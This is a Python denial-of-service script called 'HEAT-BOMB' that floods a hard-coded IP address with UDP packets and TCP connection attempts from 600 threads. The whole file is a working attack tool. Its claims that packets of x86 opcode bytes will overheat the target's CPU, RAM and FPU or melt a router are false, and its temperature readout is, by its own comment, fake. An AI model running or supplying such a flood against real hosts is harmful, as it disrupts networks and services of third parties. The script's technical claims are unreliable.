import socket
import threading
import time
import random

target = "62.109.121.42"

# HEAT GENERATOR PAYLOADS - DESIGNED TO MAX CPU, RAM, AND HEAT
HEAT_PAYLOADS = [
    # 1. CPU HEATER - Complex computation patterns
    bytes([0x43, 0x50, 0x55, 0x48] +  # CPUH
          [0x0F, 0x31] * 30 +  # RDTSC instructions (CPU cycle counter)
          [0x9C, 0x58] * 30),  # PUSHFD/POPFD spam
    
    # 2. RAM HEATER - Memory intensive patterns  
    bytes([0x52, 0x41, 0x4D, 0x48] +  # RAMH
          [0x00] * 4 + [0xFF] * 4 + [0xAA] * 4 + [0x55] * 4 +  # Alternating cache lines
          [i % 256 for i in range(112)]),  # Sequential memory access
    
    # 3. CACHE THRASHER - L1/L2/L3 cache destruction
    bytes([0x43, 0x41, 0x43, 0x48] +  # CACH
          [random.randint(0, 255) for _ in range(124)]),  # Random cache pollution
    
    # 4. BRANCH MISSPREDICTOR - CPU pipeline killer
    bytes([0x42, 0x52, 0x4E, 0x43] +  # BRNC
          [0x74, 0x01, 0x90] * 40),  # JZ + NOP patterns (branch hell)
    
    # 5. FLOATING POINT HEATER - FPU overload
    bytes([0x46, 0x50, 0x55, 0x48] +  # FPUH
          [0xD9, 0xEE] * 30 +  # FLDZ instructions
          [0xDE, 0xC9] * 30),  # FMULP spam
    
    # 6. SOCKET TABLE HEATER - Connection table explosion
    bytes([0x53, 0x4F, 0x43, 0x4B] +  # SOCK
          [0xFF, 0xFF, 0x00, 0x00] * 31),  # Socket state patterns
    
    # 7. INTERRUPT HEATER - IRQ storm
    bytes([0x49, 0x52, 0x51, 0x48] +  # IRQH
          [0xCD, 0x80] * 30 +  # INT 80h (software interrupt)
          [0xCC] * 64),  # INT 3 breakpoints
    
    # 8. DMA HEATER - Direct Memory Access torture
    bytes([0x44, 0x4D, 0x41, 0x48] +  # DMAH
          [0x00, 0x10, 0x00, 0x20, 0x00, 0x40, 0x00, 0x80] * 15),  # Memory addresses
]

# TRIPLE-KILL ATTACK: UDP + SYN + RAW PACKETS
packets_sent = 0
start_time = time.time()

# UDP HEAT ATTACK
def udp_heat(thread_id):
    global packets_sent
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        try:
            payload = random.choice(HEAT_PAYLOADS)
            port = random.randint(1, 65535)
            sock.sendto(payload, (target, port))
            packets_sent += 1
        except:
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

# SYN HEAT ATTACK - CONNECTION TABLE EXPLOSION
def syn_heat(thread_id):
    global packets_sent
    
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.001)
            port = random.randint(1, 65535)
            
            # Send SYN with heat payload in options
            sock.connect_ex((target, port))
            packets_sent += 1
            
            # Don't close immediately - leave hanging for RAM usage
            if random.random() < 0.3:  # 30% leave open
                time.sleep(0.01)
            sock.close()
            
        except:
            pass

# MULTIPORT SPAM - MAXIMUM HEAT GENERATION
def multiport_heat(thread_id):
    global packets_sent
    
    # Create multiple sockets for parallel heat
    sockets = []
    for _ in range(10):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sockets.append(s)
        except:
            pass
    
    while True:
        try:
            payload = random.choice(HEAT_PAYLOADS)
            
            # Send to multiple ports simultaneously (MORE HEAT)
            for _ in range(random.randint(5, 20)):
                port = random.randint(1, 65535)
                sock = random.choice(sockets)
                sock.sendto(payload, (target, port))
                packets_sent += 1
                
        except:
            pass

# LAUNCH TRIPLE-KILL ATTACK
print("🔥 HEAT-BOMB LAUNCHING...")
print(f"🎯 Target: {target}")
print("💥 3-PRONG HEAT ATTACK:")
print("  1. UDP Heat (200 threads)")
print("  2. SYN Heat (200 threads)")
print("  3. MultiPort Heat (200 threads)")
print("="*50)

# Start UDP heat threads
for i in range(200):
    t = threading.Thread(target=udp_heat, args=(i,))
    t.daemon = True
    t.start()

# Start SYN heat threads
for i in range(200):
    t = threading.Thread(target=syn_heat, args=(i,))
    t.daemon = True
    t.start()

# Start MultiPort heat threads
for i in range(200):
    t = threading.Thread(target=multiport_heat, args=(i,))
    t.daemon = True
    t.start()

# HEAT MONITOR LOGGING
last_log = time.time()
heat_cycles = 0

while True:
    time.sleep(1)
    elapsed = time.time() - last_log
    last_log = time.time()
    
    pps = int(packets_sent / elapsed) if elapsed > 0 else 0
    packets_sent = 0
    heat_cycles += 1
    
    # Calculate estimated heat increase (fake but motivational)
    estimated_heat = 40 + (heat_cycles * 0.5) + (pps / 10000)
    estimated_cpu = min(100, 20 + (pps / 500))
    estimated_ram = min(100, 15 + (pps / 300))
    
    print(f"🔥 HEAT-BOMB | {pps}/s | CPU: {estimated_cpu:.0f}% | RAM: {estimated_ram:.0f}% | TEMP: {estimated_heat:.0f}°C")
    
    # Emergency heat warning
    if estimated_heat > 120:
        print("🚨 CRITICAL HEAT DETECTED! MELTING IMMINENT! 🚨")
    elif estimated_heat > 100:
        print("⚠️  HIGH HEAT WARNING! ROUTER COOKING! ⚠️")
    
    # Reset heat cycles every 60 seconds
    if heat_cycles >= 60:
        heat_cycles = 30  # Keep some baseline heat
